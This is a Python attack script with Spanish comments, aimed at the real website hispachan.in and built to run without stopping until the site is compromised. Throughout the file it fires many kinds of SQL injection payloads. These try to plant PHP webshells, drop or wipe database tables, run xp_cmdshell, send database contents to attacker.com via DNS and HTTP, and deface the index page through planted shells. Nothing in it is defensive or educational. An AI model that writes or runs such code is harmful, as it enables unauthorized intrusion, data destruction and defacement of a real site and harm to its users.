#!/usr/bin/env python3
import cloudscraper
import requests
import time
import urllib.parse
import base64
import threading
import socket
import ssl
import subprocess
import os
import random
import string
from concurrent.futures import ThreadPoolExecutor, as_completed

TARGET = "hispachan.in"
TARGET_URL = "https://hispachan.in/"

class UltimatePwn:
    def __init__(self):
        self.scraper = cloudscraper.create_scraper(
            browser={'browser': 'chrome', 'platform': 'linux', 'desktop': True}
        )
        self.attempt = 0
        self.success = False
        
    def exploit_blind_sqli_time_based(self):
        """Explotar Blind SQLi usando time-based"""
        print(f"\n[ATTEMPT {self.attempt}] TIME-BASED BLIND SQL INJECTION")
        
        # Verificar si es vulnerable a time-based
        print("  Testing time-based SQLi...")
        test_payloads = [
            "1' AND SLEEP(5)--",
            "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
            "1'; WAITFOR DELAY '00:00:05'--",
            "1' AND BENCHMARK(10000000,MD5('test'))--"
        ]
        
        for payload in test_payloads:
            url = f"{TARGET_URL}?board={urllib.parse.quote(payload)}"
            try:
                start = time.time()
                r = self.scraper.get(url, timeout=15)
                elapsed = time.time() - start
                
                if elapsed > 4:
                    print(f"    [!] TIME-BASED SQLi CONFIRMED with: {payload[:30]}...")
                    
                    # Extraer información usando time-based
                    self.extract_via_time_based()
                    return True
            except:
                pass
        
        return False
    
    def extract_via_time_based(self):
        """Extraer datos usando time-based blind SQLi"""
        print("    Extracting data via time-based...")
        
        # Extraer versión
        version_length = 0
        for i in range(1, 50):
            payload = f"1' AND IF(LENGTH(@@version)={i},SLEEP(3),0)--"
            url = f"{TARGET_URL}?board={urllib.parse.quote(payload)}"
            try:
                start = time.time()
                r = self.scraper.get(url, timeout=10)
                if time.time() - start > 2:
                    version_length = i
                    print(f"      Version length: {version_length}")
                    break
            except:
                pass
        
        # Extraer cada carácter
        version = ""
        for pos in range(1, version_length + 1):
            for char_code in range(32, 127):
                payload = f"1' AND IF(ASCII(SUBSTRING(@@version,{pos},1))={char_code},SLEEP(2),0)--"
                url = f"{TARGET_URL}?board={urllib.parse.quote(payload)}"
                try:
                    start = time.time()
                    r = self.scraper.get(url, timeout=10)
                    if time.time() - start > 1.5:
                        version += chr(char_code)
                        print(f"      Version: {version}")
                        break
                except:
                    pass
        
        # Intentar escribir archivo
        write_payloads = [
            f"1' AND IF((SELECT 'HACKED' INTO OUTFILE '/tmp/hacked{self.attempt}.txt'),SLEEP(3),0)--",
            f"1' AND IF((SELECT '<?php system($_GET[\"c\"]); ?>' INTO OUTFILE '/var/www/html/s{self.attempt}.php'),SLEEP(3),0)--"
        ]
        
        for wp in write_payloads:
            url = f"{TARGET_URL}?board={urllib.parse.quote(wp)}"
            try:
                self.scraper.get(url, timeout=10)
                print(f"      Write attempt: {wp[:50]}...")
            except:
                pass
    
    def exploit_error_based_sqli(self):
        """Explotar error-based SQLi con técnicas avanzadas"""
        print(f"\n[ATTEMPT {self.attempt}] ERROR-BASED SQL INJECTION")
        
        error_payloads = [
            # MySQL error-based
            "' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e))--",
            "' AND updatexml(1,concat(0x7e,(SELECT database()),0x7e),1)--",
            "' AND exp(~(SELECT * FROM (SELECT database())a))--",
            "' AND JSON_KEYS((SELECT CONVERT((SELECT CONCAT(database())) USING utf8)))--",
            "' AND (SELECT * FROM (SELECT NAME_CONST(database(),1),NAME_CONST(database(),1)) a)--",
            
            # PostgreSQL error-based
            "' AND 1=CAST((SELECT database()) AS INT)--",
            "' AND 1=convert(int,(SELECT database()))--",
            
            # MSSQL error-based
            "' AND 1=CONVERT(INT,(SELECT @@version))--",
            "' AND 1=CAST((SELECT @@version) AS INT)--",
        ]
        
        for payload in error_payloads:
            url = f"{TARGET_URL}?board={urllib.parse.quote(payload)}"
            try:
                r = self.scraper.get(url, timeout=10)
                
                # Buscar errores en la respuesta
                if any(error in r.text.lower() for error in 
                       ["error", "warning", "mysql", "sql", "syntax", "database"]):
                    print(f"    [!] ERROR-BASED SQLi with: {payload[:50]}...")
                    
                    # Extraer información del error
                    import re
                    errors = re.findall(r'error.*?:.*?["\']([^"\']+)["\']', r.text, re.IGNORECASE)
                    for error in errors:
                        print(f"      Extracted: {error}")
            except:
                pass
    
    def exploit_union_based_sqli(self):
        """Explotar UNION-based SQLi"""
        print(f"\n[ATTEMPT {self.attempt}] UNION-BASED SQL INJECTION")
        
        # Determinar número de columnas
        for num_cols in range(1, 20):
            nulls = ",".join(["NULL"] * num_cols)
            payload = f"' UNION SELECT {nulls}--"
            url = f"{TARGET_URL}?board={urllib.parse.quote(payload)}"
            
            try:
                r = self.scraper.get(url, timeout=10)
                if "error" not in r.text.lower():
                    print(f"    [!] Found {num_cols} columns")
                    
                    # Extraer datos
                    data_payloads = [
                        f"' UNION SELECT {','.join(['database()'] + ['NULL'] * (num_cols-1))}--",
                        f"' UNION SELECT {','.join(['user()'] + ['NULL'] * (num_cols-1))}--",
                        f"' UNION SELECT {','.join(['version()'] + ['NULL'] * (num_cols-1))}--",
                        f"' UNION SELECT {','.join(['table_name'] + ['NULL'] * (num_cols-1))} FROM information_schema.tables--",
                    ]
                    
                    for dp in data_payloads:
                        url = f"{TARGET_URL}?board={urllib.parse.quote(dp)}"
                        try:
                            r = self.scraper.get(url, timeout=10)
                            print(f"      Payload: {dp[:50]}...")
                        except:
                            pass
                    
                    # Intentar escribir webshell
                    if num_cols >= 1:
                        shell_payload = f"' UNION SELECT {','.join([\"'<?php system($_GET[c]); ?>'\" ] + ['NULL'] * (num_cols-1))} INTO OUTFILE '/var/www/html/union{self.attempt}.php'--"
                        url = f"{TARGET_URL}?board={urllib.parse.quote(shell_payload)}"
                        try:
                            self.scraper.get(url, timeout=10)
                            print(f"      Webshell write attempt via UNION")
                        except:
                            pass
                    
                    break
            except:
                pass
    
    def exploit_boolean_blind_advanced(self):
        """Boolean-based blind SQLi avanzado"""
        print(f"\n[ATTEMPT {self.attempt}] BOOLEAN-BASED BLIND SQL INJECTION")
        
        # Verificar diferencia en respuestas
        true_payload = "1' AND '1'='1"
        false_payload = "1' AND '1'='2"
        
        try:
            true_url = f"{TARGET_URL}?board={urllib.parse.quote(true_payload)}"
            false_url = f"{TARGET_URL}?board={urllib.parse.quote(false_payload)}"
            
            r_true = self.scraper.get(true_url, timeout=10)
            r_false = self.scraper.get(false_url, timeout=10)
            
            diff = abs(len(r_true.text) - len(r_false.text))
            
            if diff > 0:
                print(f"    [!] Boolean-based confirmed. Difference: {diff} bytes")
                
                # Extraer datos boolean-based
                self.extract_boolean_based(len(r_true.text), len(r_false.text))
        except:
            pass
    
    def extract_boolean_based(self, true_len, false_len):
        """Extraer datos usando boolean-based"""
        print("      Extracting data...")
        
        # Extraer tablas
        for i in range(10):
            table_name = ""
            for pos in range(1, 30):
                found = False
                for char in string.ascii_lowercase + string.digits + "_":
                    payload = f"1' AND SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT {i},1),{pos},1)='{char}'--"
                    url = f"{TARGET_URL}?board={urllib.parse.quote(payload)}"
                    
                    try:
                        r = self.scraper.get(url, timeout=5)
                        if len(r.text) == true_len:
                            table_name += char
                            found = True
                            break
                    except:
                        pass
                
                if not found:
                    break
            
            if table_name:
                print(f"        Table: {table_name}")
                
                # Intentar modificar datos en la tabla
                update_payloads = [
                    f"1'; UPDATE {table_name} SET content='HACKED' WHERE 1=1--",
                    f"1'; INSERT INTO {table_name} VALUES ('HACKED')--",
                    f"1'; DELETE FROM {table_name} WHERE 1=1--",
                ]
                
                for up in update_payloads:
                    url = f"{TARGET_URL}?board={urllib.parse.quote(up)}"
                    try:
                        self.scraper.get(url, timeout=5)
                        print(f"        Update attempt on {table_name}")
                    except:
                        pass
    
    def exploit_stacked_queries(self):
        """Explotar stacked queries"""
        print(f"\n[ATTEMPT {self.attempt}] STACKED QUERIES INJECTION")
        
        stacked_payloads = [
            "1'; DROP TABLE users--",
            "1'; CREATE TABLE hacked (id INT, data VARCHAR(100))--",
            "1'; INSERT INTO hacked VALUES (1, 'PWNED')--",
            "1'; EXEC xp_cmdshell 'echo HACKED > C:\\hacked.txt'--",
            "1'; SELECT pg_sleep(5)--",
            "1'; SELECT * FROM users; SELECT SLEEP(5)--",
        ]
        
        for payload in stacked_payloads:
            url = f"{TARGET_URL}?board={urllib.parse.quote(payload)}"
            try:
                r = self.scraper.get(url, timeout=10)
                print(f"    Stacked query attempt: {payload[:50]}...")
            except:
                pass
    
    def exploit_second_order_sqli(self):
        """Second-order SQL injection"""
        print(f"\n[ATTEMPT {self.attempt}] SECOND-ORDER SQL INJECTION")
        
        # Primero, insertar payload malicioso
        register_payloads = [
            "admin'--",
            "admin' OR '1'='1",
            "admin'; DROP TABLE users--",
        ]
        
        for payload in register_payloads:
            # Intentar registrar/insertar el payload
            data = {
                "username": payload,
                "password": "password",
                "email": f"{payload}@test.com",
                "name": payload,
                "comment": payload
            }
            
            try:
                # POST a diferentes endpoints
                for endpoint in ["/register", "/signup", "/comment", "/post"]:
                    r = self.scraper.post(TARGET_URL + endpoint, data=data, timeout=10)
                    print(f"    Second-order payload planted at {endpoint}")
            except:
                pass
    
    def exploit_out_of_band_sqli(self):
        """Out-of-band SQL injection"""
        print(f"\n[ATTEMPT {self.attempt}] OUT-OF-BAND SQL INJECTION")
        
        # DNS exfiltration payloads
        oob_payloads = [
            f"1' AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\',database(),'.attacker.com\\\\a')))--",
            f"1' AND (SELECT * FROM users WHERE username='admin' AND LOAD_FILE(CONCAT('\\\\\\\\',password,'.attacker.com\\\\a')))--",
            f"1'; EXEC master..xp_dirtree '\\\\attacker.com\\test'--",
            f"1' AND extractvalue(1,concat(0x7e,(SELECT LOAD_FILE(CONCAT('http://attacker.com/',database())))))--",
        ]
        
        for payload in oob_payloads:
            url = f"{TARGET_URL}?board={urllib.parse.quote(payload)}"
            try:
                self.scraper.get(url, timeout=10)
                print(f"    OOB attempt: {payload[:50]}...")
            except:
                pass
    
    def check_and_verify(self):
        """Verificar si el sitio fue comprometido"""
        print(f"\n[*] Verificando compromiso...")
        
        try:
            r = self.scraper.get(TARGET_URL, timeout=10)
            if any(indicator in r.text for indicator in ["HACKED", "PWNED", "MODIFIED"]):
                print("\n" + "="*60)
                print("[!!!] ÉXITO - SITIO WEB MODIFICADO")
                print("="*60)
                self.success = True
                return True
        except:
            pass
        
        # Verificar webshells
        for i in range(self.attempt + 1):
            for shell in [f"s{i}.php", f"union{i}.php", f"shell{i}.php", "pwn.php", "cmd.php"]:
                try:
                    r = self.scraper.get(TARGET_URL + shell, timeout=5)
                    if r.status_code == 200:
                        print(f"\n[!!!] WEBSHELL ACTIVO: {TARGET_URL}{shell}")
                        
                        # Intentar ejecutar comando
                        cmd_url = f"{TARGET_URL}{shell}?c=echo%20HACKED%20>%20index.html"
                        self.scraper.get(cmd_url, timeout=5)
                        
                        self.success = True
                        return True
                except:
                    pass
        
        return False
    
    def run_forever(self):
        """Ejecutar hasta comprometer el sitio"""
        print("\n" + "="*60)
        print("ULTIMATE PWN - NO STOP UNTIL PWNED")
        print("="*60)
        
        while not self.success:
            self.attempt += 1
            print(f"\n{'='*40}")
            print(f"PWN ATTEMPT #{self.attempt}")
            print(f"{'='*40}")
            
            # Ejecutar todos los métodos de SQLi
            methods = [
                self.exploit_blind_sqli_time_based,
                self.exploit_error_based_sqli,
                self.exploit_union_based_sqli,
                self.exploit_boolean_blind_advanced,
                self.exploit_stacked_queries,
                self.exploit_second_order_sqli,
                self.exploit_out_of_band_sqli,
            ]
            
            # Ejecutar en paralelo
            with ThreadPoolExecutor(max_workers=7) as executor:
                futures = [executor.submit(method) for method in methods]
                for future in as_completed(futures):
                    try:
                        future.result(timeout=60)
                    except:
                        pass
            
            # Verificar éxito
            if self.check_and_verify():
                break
            
            print(f"\n[*] Attempt {self.attempt} completed. Continuing relentlessly...")
            time.sleep(1)
        
        print("\n[!!!] OBJETIVO COMPLETADO - SITIO PWNED")

def main():
    pwn = UltimatePwn()
    pwn.run_forever()

if __name__ == "__main__":
    main()